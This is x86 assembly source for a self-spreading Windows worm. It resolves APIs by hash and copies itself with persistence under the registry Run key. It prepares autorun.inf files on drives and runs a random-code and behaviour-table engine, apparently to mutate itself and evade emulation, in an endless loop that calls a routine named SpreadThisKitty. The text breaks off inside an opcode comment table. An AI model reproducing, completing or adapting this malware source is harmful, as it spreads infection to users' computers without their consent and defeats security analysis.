rBCD	  EQU 00001110b
rABCD	  EQU 00001111b
rP	  EQU 00010000b
rAP	  EQU 00010001b
rBP	  EQU 00010010b
rCP	  EQU 00010100b
rDP	  EQU 00011000b
rCDP	  EQU 00011100b
rACP	  EQU 00010101b
rBCP	  EQU 00010110b
rADP	  EQU 00011001b
rBDP	  EQU 00011010b
rBCDP	  EQU 00011110b
rABCDP	  EQU 00011111b
rS	  EQU 00100000b
rAS	  EQU 00100001b
rBS	  EQU 00100010b
rABS	  EQU 00100011b
rCS	  EQU 00100100b
rACS	  EQU 00100101b
rBCS	  EQU 00100110b
rABCS	  EQU 00100111b
rDS	  EQU 00101000b
rADS	  EQU 00101001b
rCDS	  EQU 00101100b
rACDS	  EQU 00101101b
rABCDS	  EQU 00101111b
rPS	  EQU 00110000b
rBPS	  EQU 00110010b
rCPS	  EQU 00110100b
rACPS	  EQU 00110101b
rBCPS	  EQU 00110110b
rDPS	  EQU 00111000b
rABCDPS   EQU 00111111b
rI	  EQU 01000000b
rAI	  EQU 01000001b
rCI	  EQU 01000100b
rACI	  EQU 01000101b
rSI	  EQU 01100000b
rASI	  EQU 01100001b
rABSI	  EQU 01100011b
rCSI	  EQU 01100100b
rACSI	  EQU 01100101b
rDSI	  EQU 01101000b
rADSI	  EQU 01101001b
rCDSI	  EQU 01101100b
rACDSI	  EQU 01101101b
rABCDSI   EQU 01101111b
rPSI	  EQU 01110000b
rAPSI	  EQU 01110001b
rBPSI	  EQU 01110010b
rABPSI	  EQU 01110011b
rACPSI	  EQU 01110101b
rABCPSI   EQU 01110111b
rDPSI	  EQU 01111000b
rADPSI	  EQU 01111001b
rBDPSI	  EQU 01111010b
rCDPSI	  EQU 01111100b
rACDPSI   EQU 01111101b
rBCDPSI   EQU 01111110b
rABCDPSI  EQU 01111111b
rF	  EQU 10000000b
rAF	  EQU 10000001b
rBF	  EQU 10000010b
rABF	  EQU 10000011b
rCF	  EQU 10000100b
rACF	  EQU 10000101b
rABCF	  EQU 10000111b
rDF	  EQU 10001000b
rADF	  EQU 10001001b
rBDF	  EQU 10001010b
rABDF	  EQU 10001011b
rPF	  EQU 10010000b
rAPF	  EQU 10010001b
rBPF	  EQU 10010010b
rACPF	  EQU 10010101b
rBCPF	  EQU 10010110b
rDPF	  EQU 10011000b
rBDPF	  EQU 10011010b
rCDPF	  EQU 10011100b
rSF	  EQU 10100000b
rACSF	  EQU 10100101b
rCDSF	  EQU 10101100b
rACDSF	  EQU 10101101b
rABCDSF   EQU 10101111b
rDPSF	  EQU 10111000b
rCIF	  EQU 11000100b
rCSIF	  EQU 11100100b
rCDSIF	  EQU 11101100b
rACDSIF   EQU 11101101b
rACPSIF   EQU 11110101b
rADPSIF   EQU 11111001b
rBDPSIF   EQU 11111010b
rCDPSIF   EQU 11111100b
rBCDPSIF  EQU 11111110b
rABCDPSIF EQU 11111111b


rNoEmul   EQU 10110101b

		stKey: times 47 db 0x0 ; ""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"", 0x0

		hKey  dd 0x0

		hVEH		   dd 0x0
		RandomNumber	   dd 0x0
		tmpAddress	   dd 0x0
		tmpRetVal	   dd 0x0

		hTempAlloc2	   dd 0x0

		hDataMirror	   dd 0x0

		hCreateFileAR	     dd 0x0
		hCreateFileMappingAR dd 0x0

		hExecutionMirror   dd 0x0
		hLBTFileCode	   dd 0x0
		tmpMemProtection   dd 0x0
		hStackMirror	   dd 0x0
		hStackSize	   dd 0x0
		tmpAddress1	   dd 0x0
		hStackStart	   dd 0x0
		tmpGBT		   db 0x0
		hMyFileName	   dd 0x0
		SpaceForHDC:	   dd 0x0   ; should be 0x0, C:\
		RandomFileName: times 13 db 0x0

		SpaceForHDC2:	   dd 0x0   ; should be 0x0, X:\
		RandomFileName2:times 13 db 0x0

		WormCodeStart	dd 0x0
		RndNumCycle	dd 0x0

		hDataMirror1 dd 0x0

		hCreateFileRndFile dd 0x0
		dFileSize	   dd 0x0
		hCreateMapRndFile  dd 0x0
		tmpAddress2	   dd 0x0
		hMapViewRndFile    dd 0x0


	hTempAlloc1	  dd 0x0

		stAutoRunContent: times 52 db 0x0

		bExceptionFC1 db 0x0
		bExceptionRC1 db 0x0
		bExceptionFC2 db 0x0
		bExceptionRC2 db 0x0
		bExceptionFC2SIM db 0x0
		bExceptionRC2SIM db 0x0

		BBExceptionCount  db 0x0
		hRandomizedData   dd 0x0
		_VirtualProtect1  dd 0x0

		stAutorunWithDrive db 0x0, 0x0, 0x0	; ""X:\""
		stAutoruninf: times 12 db 0x0
			      ; ""autorun.inf""

		hRandomizedData1 dd 0x0
		tmpDWA dd 0x0
		tmpDWB dd 0x0
		tmpDWC dd 0x0
		CGPushPop db 0x0
	tmpReg4Mirror:
		tmpDW1 dd 0x0
		tmpDW2 dd 0x0
		tmpDW3 dd 0x0
		tmpDW4 dd 0x0
		tmpDW5 dd 0x0
		tmpDW6 dd 0x0
		tmpDW7 dd 0x0
		tmpDW8 dd 0x0

		sESP dd 0x0

		rEAX dd 0x0
		rECX dd 0x0
		rEDX dd 0x0
		rEBX dd 0x0
		rEBP dd 0x0
		rESI dd 0x0
		rEDI dd 0x0

		dd 0x0, 0x0, 0x0, 0x0

		hDataMirror2 dd 0x0

		hPrepareRegistersAndTable dd 0x0
		hMirrorTheMemory	  dd 0x0

	_VirtualAlloc1	dd 0x0

	_DLLkernel32:	 times 13 db 0x0
	hDLLkernel32	 dd 0x0

	_DLLadvapi32:	 times 13 db 0x0
	hDLLadvapi32	 dd 0x0

	hKernelPE    dd 0x0

	hAddressTable dd 0x0
	hNamePointerTable dd 0x0
	hOrdinalTable dd 0x0

	APINumbersKernel EQU (APIMagicNumbersKernel32End-APIMagicNumbersKernel32)/4

	APIMagicNumbersKernel32:
;                hashAddVectoredExceptionHandler dd 0x85D3
						    ; The VEH APIs are directly redirected to ntdll, so the entry in the AddressTable is not valid
						    ; this counts for XP, Vista and probably Vista+, too
		hashCloseHandle     dd 0xA2C8
		hashCopyFileA	    dd 0x8ADF
		hashCreateFileA     dd 0x89DE
		hashCreateFileMappingA dd 0xD198
		hashGetCommandLineA dd 0x8287
		hashGetDriveTypeA   dd 0x6586
		hashGetFileSize     dd 0x87DF
		hashGetTickCount    dd 0xEBAE
		hashMapViewOfFile   dd 0xA6D0
;                hashRemoveVectoredExceptionHandler dd 0xB98C
		hashSetErrorMode    dd 0xCF8D
		hashSleep	    dd 0x6EAA
		hashUnmapViewOfFile dd 0xA5F9
		hashVirtualAlloc    dd 0xC563
		hashVirtualFree     dd 0x88F0
		hashVirtualProtect  dd 0xAE67
	APIMagicNumbersKernel32End:

	APIAddressesKernel:
;                _AddVectoredExceptionHandler dd 0x0
		_CloseHandle	 dd 0x0
		_CopyFileA	 dd 0x0
		_CreateFileA	 dd 0x0
		_CreateFileMappingA dd 0x0
		_GetCommandLineA dd 0x0
		_GetDriveTypeA	 dd 0x0
		_GetFileSize	 dd 0x0
		_GetTickCount	 dd 0x0
		_MapViewOfFile	 dd 0x0
;                _RemoveVectoredExceptionHandler dd 0x0
		_SetErrorMode	 dd 0x0
		_Sleep		 dd 0x0
		_UnmapViewOfFile dd 0x0
		_VirtualAlloc	 dd 0x0
		_VirtualFree	 dd 0x0
		_VirtualProtect  dd 0x0

	APINumbersAdvapi EQU (APIMagicNumbersAdvapi32End-APIMagicNumbersAdvapi32)/4

	APIMagicNumbersAdvapi32:
		hashRegCloseKey       dd 0x84C2
		hashRegCreateKeyExA   dd 0xAC9F
		hashRegSetValueExA    dd 0xC655
	APIMagicNumbersAdvapi32End:

	APIAddressesAdvapi:
		_RegCloseKey	  dd 0x0
		_RegCreateKeyExA  dd 0x0
		_RegSetValueExA   dd 0x0



	APICurrentMagicNum dd 0x0
	APICurrentNumber   dd 0x0
	APICurrentAddress  dd 0x0

; ###########################################################################
; ###########################################################################
; #####
; #####   Local BehaviourTable
; #####



LocalBehaviourTable:
	CommandNumber	   EQU (EndPaddedCommands-StartPaddedCommands)/8
	BehaviourTableSize EQU 18*4
			   ; Has to be a mulitple of 4!

		; Each behaviour Block consists of:
		; Registers: 9*4=36 byte
		;  0x00 dd EAX
		;  0x04 dd EBX
		;  0x08 dd ECX
		;  0x0C dd EDX
		;  0x10 dd EBP
		;  0x14 dd ESI
		;  0x18 dd EDI
		;  0x1C dd FLAGS
		;  0x20 dd ESP

		; Memory: 2*4*4=8*4=32 byte:
		;  0x24 dd MemOffset1
		;  0x28 dword[MemOffset1]
		;  0x2C dd MemOffset2
		;  0x30 dword[MemOffset2]
		;  0x34 dd MemOffset3
		;  0x38 dword[MemOffset3]
		;  0x3C dd MemOffset4
		;  0x40 dword[MemOffset4]

		; Stack: 1*4=4 byte
		; (could be extented, but i like it that way more :) )
		;  0x44 STACK change (if push is used)

	TempBehaviourTable: times BehaviourTableSize db 0x0

	BBTableFileCode: times BehaviourTableSize db 0x0
	BBTableRandomCode: times BehaviourTableSize db 0x0



; #####
; #####   Local BehaviourTable
; #####
; ###########################################################################
; ###########################################################################


; ###########################################################################
; ###########################################################################
; #####
; #####   Buffers for execution
; #####

		RandomCodeBufferSize EQU 0x08
					 ; At some parts, the code relies on
					 ; that value, so check that when you
					 ; change it.

		CodeExecDifference EQU (RandomCodeExecutionWithoutPRAT-RandomCodeExecution)
		CodeExecSize EQU (RandomCodeExectionEnd-RandomCodeExecution)


RandomCodeExecution:
		call	dword[hPrepareRegistersAndTable]
   RandomCodeExecutionWithoutPRAT:

			call	dword[hMirrorTheMemory]

		RandomCode:
;                add al, 1
;                 mov byte[tmpDWA], 33
			times RandomCodeBufferSize db 0x90
		RC_End:
		times (8-RC_End+RandomCode): nop	  ; padding
		RC_Padding:	times 8 db 0x90 ; If error occure and malicous code is generated
						; As buffer that this malicous code does not ""overwrite"" the opcodes of the next ""call""
		call	dword[hAnalyseBehaviourOfCode]
   ret
RandomCodeExectionEnd:


FileCodeExection:
		call	dword[hPrepareRegistersAndTable]
   FileCodeExecutionWithoutPRAT:

			call	dword[hMirrorTheMemory]

		BufferForCode:

			times RandomCodeBufferSize db 0x90
		FC_Padding:	times 8 db 0x90 ; If error occure and malicous code is generated
						; As buffer that this malicous code does not ""overwrite"" the opcodes of the next ""call""
		call	dword[hAnalyseBehaviourOfCode]
   ret
FileCodeExectionEnd:



; #####
; #####   Buffers for execution
; #####
; ###########################################################################
; ###########################################################################




DataEnd:

	times 8 db 0x0


.code
CodeStart:
; Temp Code

StartPaddedCommands:
		cc rNoEmul, call,    GetAllAPIAddresses 	; Will receive the addresses of all
								; required APIs from kernel32.dll and advapi32.dll
								; using a 16bit hash for each API name. The hash
								; will be calculated with a simple XOR/SUB/ADD algorithm

		cc rNoEmul, stdcall, dword[_GetTickCount]
		cc rNoRes,  mov,     dword[RandomNumber], eax

		cc rNoRes,  push,    0x8007
		cc rNoEmul, stdcall, dword[_SetErrorMode]

		cc rNoEmul, stdcall, dword[_GetCommandLineA]
		cc rNoRes,  mov,     dword[hMyFileName], eax
		cc rF,	    cmp,     byte[eax], '""'
		cc rNoEmul, jne,     FileNameIsFine
		cc rA,	    inc,     eax
		cc rA,	    mov,     dword[hMyFileName], eax

		FindFileNameLoop:
			cc rA,	     inc,     eax
			cc rAF,      cmp,     byte[eax], '""'
		cc rNoEmul, jne,     FindFileNameLoop

		cc rNoRes,  mov,     byte[eax], 0x0
		FileNameIsFine:

		cc rNoEmul, call,    CopyFileAndRegEntry

		cc rNoRes,  push,    PAGE_READONLY
		cc rNoRes,  push,    MEM_COMMIT
		cc rNoRes,  push,    (DataEnd-DataStart)
		cc rNoRes,  push,    0x0		     ; lpAddress - optional
		cc rNoEmul, stdcall, dword[_VirtualAlloc]    ; For mirroring the Memory
		cc rA,	    mov,     dword[hDataMirror], eax
		cc rA,	    mov,     dword[hDataMirror1], eax	  ; This may be destroyed by a random
		cc rNoRes,  mov,     dword[hDataMirror2], eax	  ; code. Saving it three times gives
								  ; the possibility to find the true one
								  ; anyway.

		cc rA,	    mov,     eax, dword[fs:0x4]      ; TIB: Top of stack
		cc rAB,     mov,     ebx, dword[fs:0x8]      ; TIB: Current bottom of stack
		cc rAB,     mov,     dword[hStackStart], ebx

		cc rA,	    sub,     eax, ebx		     ; eax=Size of current stack
		cc rA,	    mov,     dword[hStackSize], eax  ; Save size of stack

		cc rNoRes,  push,    PAGE_READONLY
		cc rNoRes,  push,    MEM_COMMIT
		cc rNoRes,  push,    eax
		cc rNoRes,  push,    0x0		     ; lpAddress - optional
		cc rNoEmul, stdcall, dword[_VirtualAlloc]    ; For mirroring the Stack
		cc rNoRes,  mov,     dword[hStackMirror], eax


		cc rNoRes,  push,    PAGE_READONLY
		cc rNoRes,  push,    MEM_COMMIT
		cc rNoRes,  push,    (DataEnd-DataStart)
		cc rNoRes,  push,    0x0
		cc rNoEmul, stdcall, dword[_VirtualAlloc]	      ; For generating a randomized memory
		cc rA,	    mov,     dword[hRandomizedData], eax
		cc rA,	    mov,     dword[hRandomizedData1], eax
		cc rNoEmul, call,    CreateRandomizedData

		cc rNoRes,  push,    PAGE_EXECUTE_READ
		cc rNoRes,  push,    MEM_COMMIT
		cc rNoRes,  push,    CodeExecSize
		cc rNoRes,  push,    0x0
		cc rNoEmul, stdcall, dword[_VirtualAlloc]     ; For execution of code - to prevent self-destruction :D
		cc rNoRes,  mov,     dword[hExecutionMirror], eax


		cc rNoRes,  push,    PAGE_READWRITE
		cc rNoRes,  push,    MEM_COMMIT
		cc rNoRes,  push,    2*4*4	     ; Memory BT: 4 times: 2*dd = 32byte
		cc rNoRes,  push,    0x0
		cc rNoEmul, stdcall, dword[_VirtualAlloc]
		cc rA,	    mov,     dword[hTempAlloc1], eax
		cc rNoRes,  mov,     dword[hTempAlloc2], eax	    ; eax=Temp.VirtualAlloc


		cc rA,	    mov,     eax, PrepareRegistersAndTable
		cc rNoRes,  mov,     dword[hPrepareRegistersAndTable], eax
		cc rA,	    mov,     eax, MirrorTheMemory
		cc rNoRes,  mov,     dword[hMirrorTheMemory], eax

		cc rNoEmul, call,    CreateRandomRegisters
		cc rNoEmul, call,    MakeBehaviourTableOfOwnCode


; ###########################################################################
; ###########################################################################
; #####
; #####   Random Code Execution Loop
; #####

	cc rD,	    xor, edx, edx

     LoopRnd:
	cc rCD,      xor, ecx, ecx

	LLR:
	cc rNoEmul,  pushad

		cc rNoEmul,  call,    CreateRandomCode

      ;  #####################################################################
      ;  ########
      ;  # TRY
      ;  # {
      ;  #
	    VEH_TRY RC1

		cc rA,	    mov,     eax, TempBehaviourTable
		cc rA,	    mov,     dword[tmpAddress], eax
		cc rA,	    mov,     dword[tmpAddress1], eax
		cc rNoRes,  mov,     dword[tmpAddress2], eax
		cc rA,	    xor,     eax, eax
		cc rAB,     mov,     ebx, RandomCodeExecution
		cc rNoEmul, call,    GenerateExecuteableCodeInMemory	  ; Call the Function in data section
							     ; Can not be written in .code as it's write-protected
							     ; which is important for the random-code executions
							     ; (to not destroy entire code).
		cc rNoEmul, call,    dword[hExecutionMirror] ; Can not execute it in .data section as it's not
							     ; write protected, and the random code can (and will)
							     ; overwrite itself (self-destruction). Solution:
							     ; Virtual Allocated Memory with variable Protection

      ; #
      ; #  }
      ; #  CATCH
      ; #  {
      ; #

	    VEH_EXCEPTION RC1

	    VEH_END RC1
      ; #
      ; # }
      ; ########
      ; #####################################################################


		cc rNoEmul, call,    CompareCodeBTwithRandomBT

	cc rNoEmul, popad



	cc rC,	    inc, ecx
	cc rCF,     cmp, ecx, 0x5
    cc rNoEmul, jb, LLR


	cc rNoEmul, pushad

	cc rNoRes,  push, 10
	cc rNoEmul, stdcall, dword[_Sleep]
	cc rNoEmul, popad

	cc rD,	    inc, edx
	cc rDF,     cmp, edx, 50
  cc rNoEmul,  jb,  LoopRnd

	cc rNoEmul, call,    SpreadThisKitty

	cc rD,	    xor,     edx, edx

cc rNoEmul, jmp,     LoopRnd

; #####
; #####   Random Code Execution Loop
; #####
; ###########################################################################
; ###########################################################################




; ###########################################################################
; ###########################################################################
; #####
; #####   Generate Random Code in allocated Memory for Execution
; #####

GenerateExecuteableCodeInMemory:
; In: eax=0 ... Write from RandomCodeExecution1-RandomCodeExecution1End
;     else: eax=(RandomCodeExecutionWithoutPRAT-RandomCodeExecution1)
;     ebx: Source (RandomCodeExecution or FileCodeExection)
; This function is used to generate the random code in memory, because .data section
; is READ/WRITE/EXECUTE, hence the random code can (and will) overwrite itself.
; Solution: It will be executed in a READ/EXECUTE memory.

	cc rB,	    push,    eax
	cc rNoRes,  push,    ebx

	cc rNoRes,  push,    tmpMemProtection
	cc rNoRes,  push,    PAGE_READWRITE
	cc rNoRes,  push,    CodeExecSize
	cc rNoRes,  push,    dword[hExecutionMirror]
	cc rNoEmul, stdcall, dword[_VirtualProtect]


	cc rB,	    pop,     ebx
	cc rAB,     pop,     eax

	cc rABC,    xor,     ecx, ecx
	cc rACS,    mov,     esi, ebx
	cc rCS,     add,     esi, eax
	cc rCSI,    mov,     edi, dword[hExecutionMirror]

     GenerateExecuteableCodeInMemoryMore:
	cc rACSI,   mov,     eax, dword[esi]
	cc rCSI,    mov,     dword[edi], eax
	cc rCSI,    add,     esi, 0x4
	cc rCSI,    add,     edi, 0x4
	cc rCSI,    add,     ecx, 0x4
	cc rCSIF,   cmp,     ecx, CodeExecSize
     cc rNoEmul, jb, GenerateExecuteableCodeInMemoryMore

	cc rNoRes,  push,    tmpMemProtection
	cc rNoRes,  push,    PAGE_EXECUTE_READ
	cc rNoRes,  push,    CodeExecSize
	cc rNoRes,  push,    dword[hExecutionMirror]
	cc rNoEmul, stdcall, dword[_VirtualProtect]

cc rNoEmul, ret

; #####
; #####   Generate Random Code in allocated Memory for Execution
; #####
; ###########################################################################
; ###########################################################################




; ###########################################################################
; ###########################################################################
; #####
; #####   Linear Congruent Generator (Random Number Generator)
; #####

GetRandomNumber:
		cc rNoEmul, pushad
		cc rD,	    xor,     edx, edx
		cc rAD,     mov,     eax, dword[RandomNumber]

		cc rABD,    mov,     ebx, 1103515245
		cc rA,	    mul,     ebx	    ; EDX:EAX = EDX:EAX * EBX

		cc rA,	    add,     eax, 12345
		cc rNoRes,  mov,     dword[RandomNumber], eax
		cc rNoEmul, popad
cc rNoEmul, ret


GetGoodRandomNumber:
		cc rNoEmul, pushad
		cc rC,	    mov,     ecx, dword[RandomNumber]
		cc rC,	    shr,     ecx, 11
		cc rC,	    and,     ecx, 0xF
		cc rC,	    inc,     ecx
		GetGoodRandomNumberMore:			; The linear congruent generator has some serios problems when
								; one needs ""good"" random numbers. There were patterns in the
								; numbers that leaded to wrong results
		cc rNoEmul, call,   GetRandomNumber
		cc rCF,     dec,     ecx
		cc rNoEmul, jnz,     GetGoodRandomNumberMore
		cc rNoEmul, popad
cc rNoEmul, ret


CreateSpecialRndNumber:
; in: ebx, ecx
; out: edx=(rand()%ebx + ecx)

		cc rNoEmul, call,    GetRandomNumber

		cc rBCD,    xor,     edx, edx
		cc rABCD,   mov,     eax, dword[RandomNumber]
		cc rCD,     div,     ebx

		cc rD,	    add,     edx, ecx
cc rNoEmul, ret

BBSimSpecialRndNum:
		cc rC,	     xor,     ecx, ecx
		cc rBC,      mov,     ebx, 50
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rD,	     sub,     dl, 25
		cc rAD,      mov,     eax, edx
cc rNoEmul, ret

; #####
; #####   Linear Congruent Generator (Random Number Generator)
; #####
; ###########################################################################
; ###########################################################################




; ###########################################################################
; ###########################################################################
; #####
; #####   Random Code Generator
; #####

CreateRandomCode:
; 0x00 ... add Mem8,  Reg8       0x00 (0x00-0xBF)     OPMem8Reg8
; 0x00 ... add Reg8,  Reg8       0x00 (0xC0-0xFF)     OPReg8Reg8
; 0x01 ... add Mem32, Reg32      0x01 (0x00-0xBF)     OPMem32Reg32
; 0x01 ... add Reg32, Reg32      0x01 (0xC0-0xFF)     OPReg32Reg32
; 0x02 ... add Reg8,  Mem8       0x02 (0x00-0xBF)     OPMem8Reg8
; 0x02 ... add Reg8,  Reg8       0x02 (0xC0-0xFF)     OPReg8Reg8
; 0x03 ... add Reg32, Mem32      0x03 (0x00-0xBF)     OPMem32Reg32
; 0x03 ... add Reg32, Reg32      0x03 (0xC0-0xFF)     OPReg32Reg32
; 0x04 ... add al,  Imm8         0x04 (0x00-0xFF)     OPAlImm8
; 0x05 ... add eax, Imm32        0x05 (0x00-0xFF)     OPEaxImm32
; NOT USED: 0x06, 0x07 - push ES | pop ES
; 0x08 ... or  Mem8,  Reg8       0x08 (0x00-0xBF)     OPMem8Reg8
; 0x08 ... or  Reg8,  Reg8       0x08 (0xC0-0xFF)     OPReg8Reg8
; 0x09 ... or  Mem32, Reg32      0x09 (0x00-0xBF)     OPMem32Reg32
; 0x09 ... or  Reg32, Reg32      0x09 (0xC0-0xFF)     OPReg32Reg32
; 0x0A ... or  Reg8,  Mem8       0x0A (0x00-0xBF)     OPMem8Reg8
; 0x0A ... or  Reg8,  Reg8       0x0A (0xC0-0xFF)     OPReg8Reg8
; 0x0B ... or  Reg32, Mem32      0x0B (0x00-0xBF)     OPMem32Reg32
; 0x0B ... or  Reg32, Reg32      0x0B (0xC0-0xFF)     OPReg32Reg32
; 0x0C ... or  al,  Imm8         0x0C (0x00-0xFF)     OPAlImm8
; 0x0D ... or  eax, Imm32        0x0D (0x00-0xFF)     OPEaxImm32
; NOT USED: 0x0E, 0x0F - push CS | pop CS
; 0x10 ... adc Mem8,  Reg8       0x10 (0x00-0xBF)     OPMem8Reg8
; 0x10 ... adc Reg8,  Reg8       0x10 (0xC0-0xFF)     OPReg8Reg8
; 0x11 ... adc Mem32, Reg32      0x11 (0x00-0xBF)     OPMem32Reg32
; 0x11 ... adc Reg32, Reg32      0x11 (0xC0-0xFF)     OPReg32Reg32
; 0x12 ... adc Reg8,  Mem8       0x12 (0x00-0xBF)     OPMem8Reg8
; 0x12 ... adc Reg8,  Reg8       0x12 (0xC0-0xFF)     OPReg8Reg8
; 0x13 ... adc Reg32, Mem32      0x13 (0x00-0xBF)     OPMem32Reg32
; 0x13 ... adc Reg32, Reg32      0x13 (0xC0-0xFF)     OPReg32Reg32
; 0x14 ... adc al,  Imm8         0x14 (0x00-0xFF)     OPAlImm8
; 0x15 ... adc eax, Imm32        0x15 (0x00-0xFF)     OPEaxImm32
; NOT USED: 0x16, 0x17 - push SS | pop SS
; 0x18 ... sbb Mem8,  Reg8       0x18 (0x00-0xBF)     OPMem8Reg8
; 0x18 ... sbb Reg8,  Reg8       0x18 (0xC0-0xFF)     OPReg8Reg8
; 0x19 ... sbb Mem32, Reg32      0x19 (0x00-0xBF)     OPMem32Reg32
; 0x19 ... sbb Reg32, Reg32      0x19 (0xC0-0xFF)     OPReg32Reg32
; 0x1A ... sbb Reg8,  Mem8       0x1A (0x00-0xBF)     OPMem8Reg8
; 0x1A ... sbb Reg8,  Reg8       0x1A (0xC0-0xFF)     OPReg8Reg8
; 0x1B ... sbb Reg32, Mem32      0x1B (0x00-0xBF)     OPMem32Reg32
; 0x1B ... sbb Reg32, Reg32      0x1B (0xC0-0xFF)     OPReg32Reg32
; 0x1C ... sbb al,  Imm8         0x1C (0x00-0xFF)     OPAlImm8
; 0x1D ... sbb eax, Imm32        0x1D (0x00-0xFF)     OPEaxImm32
; NOT USED: 0x16, 0x17 - push DS | pop DS
; 0x20 ... and Mem8,  Reg8       0x20 (0x00-0xBF)     OPMem8Reg8
; 0x20 ... and Reg8,  Reg8       0x20 (0xC0-0xFF)     OPReg8Reg8
; 0x21 ... and Mem32, Reg32      0x21 (0x00-0xBF)     OPMem32Reg32
; 0x21 ... and Reg32, Reg32      0x21 (0xC0-0xFF)     OPReg32Reg32
; 0x22 ... and Reg8,  Mem8       0x22 (0x00-0xBF)     OPMem8Reg8
; 0x22 ... and Reg8,  Reg8       0x22 (0xC0-0xFF)     OPReg8Reg8
; 0x23 ... and Reg32, Mem32      0x23 (0x00-0xBF)     OPMem32Reg32
; 0x23 ... and Reg32, Reg32      0x23 (0xC0-0xFF)     OPReg32Reg32
; 0x24 ... and al,  Imm8         0x24 (0x00-0xFF)     OPAlImm8
; 0x25 ... and eax, Imm32        0x25 (0x00-0xFF)     OPEaxImm32
; NOT USED: 0x26 (Superfluous) prefix
; 0x27 ... daa                   0x27                 SingleByteCommand
; 0x28 ... sub Mem8,  Reg8       0x28 (0x00-0xBF)     OPMem8Reg8
; 0x28 ... sub Reg8,  Reg8       0x28 (0xC0-0xFF)     OPReg8Reg8
; 0x29 ... sub Mem32, Reg32      0x29 (0x00-0xBF)     OPMem32Reg32
; 0x29 ... sub Reg32, Reg32      0x29 (0xC0-0xFF)     OPReg32Reg32
; 0x2A ... sub Reg8,  Mem8       0x2A (0x00-0xBF)     OPMem8Reg8
; 0x2A ... sub Reg8,  Reg8       0x2A (0xC0-0xFF)     OPReg8Reg8
; 0x2B ... sub Reg32, Mem32      0x2B (0x00-0xBF)     OPMem32Reg32
; 0x2B ... sub Reg32, Reg32      0x2B (0xC0-0xFF)     OPReg32Reg32
; 0x2C ... sub al,  Imm8         0x2C (0x00-0xFF)     OPAlImm8
; 0x2D ... sub eax, Imm32        0x2D (0x00-0xFF)     OPEaxImm32
; NOT USED: 0x2E (Superfluous) prefix
; 0x2F ... das                   0x2F                 SingleByteCommand
; 0x30 ... xor Mem8,  Reg8       0x30 (0x00-0xBF)     OPMem8Reg8
; 0x30 ... xor Reg8,  Reg8       0x30 (0xC0-0xFF)     OPReg8Reg8
; 0x31 ... xor Mem32, Reg32      0x31 (0x00-0xBF)     OPMem32Reg32
; 0x31 ... xor Reg32, Reg32      0x31 (0xC0-0xFF)     OPReg32Reg32
; 0x32 ... xor Reg8,  Mem8       0x32 (0x00-0xBF)     OPMem8Reg8
; 0x32 ... xor Reg8,  Reg8       0x32 (0xC0-0xFF)     OPReg8Reg8
; 0x33 ... xor Reg32, Mem32      0x33 (0x00-0xBF)     OPMem32Reg32
; 0x33 ... xor Reg32, Reg32      0x33 (0xC0-0xFF)     OPReg32Reg32
; 0x34 ... xor al,  Imm8         0x34 (0x00-0xFF)     OPAlImm8
; 0x35 ... xor eax, Imm32        0x35 (0x00-0xFF)     OPEaxImm32
; NOT USED: 0x36 (Superfluous) prefix
; 0x37 ... aaa                   0x37                 SingleByteCommand
; 0x38 ... cmp Mem8,  Reg8       0x38 (0x00-0xBF)     OPMem8Reg8
; 0x38 ... cmp Reg8,  Reg8       0x38 (0xC0-0xFF)     OPReg8Reg8
; 0x39 ... cmp Mem32, Reg32      0x39 (0x00-0xBF)     OPMem32Reg32
; 0x39 ... cmp Reg32, Reg32      0x39 (0xC0-0xFF)     OPReg32Reg32
; 0x3A ... cmp Reg8,  Mem8       0x3A (0x00-0xBF)     OPMem8Reg8
; 0x3A ... cmp Reg8,  Reg8       0x3A (0xC0-0xFF)     OPReg8Reg8
; 0x3B ... cmp Reg32, Mem32      0x3B (0x00-0xBF)     OPMem32Reg32
; 0x3B ... cmp Reg32, Reg32      0x3B (0xC0-0xFF)     OPReg32Reg32
; 0x3C ... cmp al,  Imm8         0x3C (0x00-0xFF)     OPAlImm8
; 0x3D ... cmp eax, Imm32        0x3D (0x00-0xFF)     OPEaxImm32
; NOT USED: 0x3E (Superfluous) prefix
; 0x3F ... aas                   0x3F                 SingleByteCommand
; 0x40 - 0x4F ... inc|dec Reg32                       IncDecReg32
; 0x50 - 0x5F ... push|pop Reg32                      PushPopReg32
; NOT USED: 0x60 - 0x67: pushad,popad,bound,arpl + prefixes
; 0x68 ... push Imm32            0x68 (0x00-0xFF)     PushImm321
; NOT USED: 0x69: imul [maybe in next versions]
; 0x6A ... push Imm32            0x68 (0x00-0xFF)     PushImm322
; NOT USED: 0x6B-0x6F: imul [maybe in next versions], inx, outx
; NOT USED: 0x70-0x7F: jxx
; 0x80 ... add|or|adc|sbb|and|sub|xor|cmp Reg8,  Imm8  0x80 (0xC0-0xFF)   VariousReg8Imm8
; 0x81 ... add|or|adc|sbb|and|sub|xor|cmp Reg32, Imm32 0x81 (0xC0-0xFF)   VariousReg32Imm32
; 0x82 ... add|or|adc|sbb|and|sub|xor|cmp Reg8,  Imm8  0x82 (0xC0-0xFF)   VariousReg8Imm8
; 0x83 ... add|or|adc|sbb|and|sub|xor|cmp Reg32, Imm32 0x83 (0xC0-0xFF)   VariousReg32Imm32
; NOT USED: 0x84,0x85: test [maybe in next versions]
; 0x86 ... xchg Mem8, Reg8:      0x86 (0x00-0xBF)     OPMem8Reg8
; 0x86 ... xchg Reg8, Reg8:      0x86 (0xC0-0xFF)     OPReg8Reg8
; 0x87 ... xchg Mem32, Reg32:    0x87 (0x00-0xBF)     OPMem32Reg32
; 0x87 ... xchg Reg32, Reg32:    0x87 (0xC0-0xFF)     OPReg32Reg32
; 0x88 ... mov Mem8, Reg8:       0x88 (0x00-0xBF)     OPMem8Reg8
; 0x88 ... mov Reg8, Reg8:       0x88 (0xC0-0xFF)     OPReg8Reg8
; 0x89 ... mov Mem32, Reg32:     0x89 (0x00-0xBF)     OPMem32Reg32
; 0x89 ... mov Reg32, Reg32:     0x89 (0xC0-0xFF)     OPReg32Reg32
; 0x8A ... mov Reg8, Mem8:       0x8A (0x00-0xBF)     OPMem8Reg8
; 0x8A ... mov Reg8, Reg8:       0x8A (0xC0-0xFF)     OPReg8Reg8
; 0x8B ... mov Mem32, Reg32:     0x8B (0x00-0xBF)     OPMem32Reg32
; 0x8B ... mov Reg32, Reg32:     0x8B (0xC0-0xFF)     OPReg32Reg32
; NOT USED: 0x8C-0x8F: mov (Segment registers), lea [maybe in next versions]
; 0x90 - 0x99 ... XCHG eax, Reg32 | CWDE | CDQ        SingleByteCommand
